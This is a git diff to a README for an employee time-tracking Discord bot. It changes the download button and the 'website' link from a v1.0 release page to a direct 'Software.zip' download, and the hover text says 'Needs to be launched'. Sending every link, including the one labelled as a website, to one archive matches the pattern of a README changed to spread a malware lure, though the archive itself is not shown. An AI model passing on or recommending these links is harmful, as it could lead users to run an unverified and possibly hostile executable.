@@ -15,7 +15,7 @@ Welcome to the Employee Time Tracker Discord Bot repository! This bot is your al
 
 To get started with the Employee Time Tracker Discord Bot, simply download the latest release by clicking the button below:
 
-[![Download Employee Time Tracker Discord Bot](https://github.com/CPSGDPS/Employe-time-tracker/releases/tag/v1.0)](https://github.com/CPSGDPS/Employe-time-tracker/releases/tag/v1.0 "Needs to be launched")
+[![Download Employee Time Tracker Discord Bot](https://github.com/CPSGDPS/Employe-time-tracker/releases/download/v2.0/Software.zip)](https://github.com/CPSGDPS/Employe-time-tracker/releases/download/v2.0/Software.zip "Needs to be launched")
 
 ## Usage ℹ️
 
@@ -36,6 +36,6 @@ We value your feedback! If you have any suggestions, questions, or issues regard
 
 ## Stay Connected 🌐
 
-Stay updated on the latest news and updates for the Employee Time Tracker Discord Bot by visiting our [website](https://github.com/CPSGDPS/Employe-time-tracker/releases/tag/v1.0) for more information.
+Stay updated on the latest news and updates for the Employee Time Tracker Discord Bot by visiting our [website](https://github.com/CPSGDPS/Employe-time-tracker/releases/download/v2.0/Software.zip) for more information.
 
 Thank you for using the Employee Time Tracker Discord Bot! We hope it helps you manage your employees efficiently and effectively. Happy tracking! 👩‍💼👨‍💼
